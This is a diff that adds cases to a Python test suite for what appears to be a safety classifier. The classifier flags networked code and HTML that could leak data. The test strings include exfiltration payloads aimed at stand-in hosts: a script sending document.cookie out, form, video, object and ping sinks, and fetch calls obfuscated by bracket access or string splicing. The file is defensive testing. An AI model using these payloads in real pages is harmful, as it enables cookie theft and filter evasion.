@@ -926,6 +926,9 @@ def test_terminal_classifier(command, unsafe):
             "from huggingface_hub import snapshot_download\nsnapshot_download('r')",
             True,
         ),  # bare-imported repo snapshot download
+        ("import httpcore\nhttpcore.request('GET', 'https://example.com')", True),
+        ("import boto3\nboto3.client('s3').list_buckets()", True),
+        ("from botocore.session import get_session\nget_session()", True),
         ("import statistics\nstatistics.mean([1, 2])", False),  # benign stdlib import stays safe
         # A concrete write callable handed to a user-defined helper that can
         # invoke it bypasses the direct open()/writer site, so it asks.
@@ -984,6 +987,10 @@ def test_render_html_gated_only_when_networked():
     assert rh("<img srcset='https://evil/x.png 1x'>") is True
     assert rh("<img src='/api/leak?d=1'>") is True  # root-relative resolves to origin
     assert rh("<link rel=stylesheet href='//cdn/x.css'>") is True  # protocol-relative
+    assert rh("<form action='https://evil/x' method='post'></form>") is True
+    assert rh("<video poster='https://evil/x.png'></video>") is True
+    assert rh("<object data='https://evil/x'></object>") is True
+    assert rh("<a ping='https://evil/x'>link</a>") is True
     # Self-navigation sinks exfiltrate by navigating the frame away.
     assert rh("<script>location.href='https://x/?d='+document.cookie</script>") is True
     assert rh("<script>location.assign('https://x')</script>") is True
@@ -995,6 +1002,15 @@ def test_render_html_gated_only_when_networked():
     # Obfuscated egress: a block comment splitting fetch(, or bracket access.
     assert rh("<script>fetch/*x*/('https://example.com')</script>") is True
     assert rh("<script>window['fetch']('https://example.com')</script>") is True
+    assert rh("<script>window[`fetch`]('https://example.com')</script>") is True
+    assert rh("<script>window['fetch'.replace('x','x')]('https://x')</script>") is True
+    assert (
+        rh(
+            "<script>const i=document.createElement('img');"
+            "i.setAttribute('src','https://evil/x')</script>"
+        )
+        is True
+    )
     # A computed bracket key spliced from string fragments on a global host object.
     assert rh("<script>window['fet'+'ch']('https://attacker.example')</script>") is True
     assert rh("<script>self['open' + '']('https://x')</script>") is True
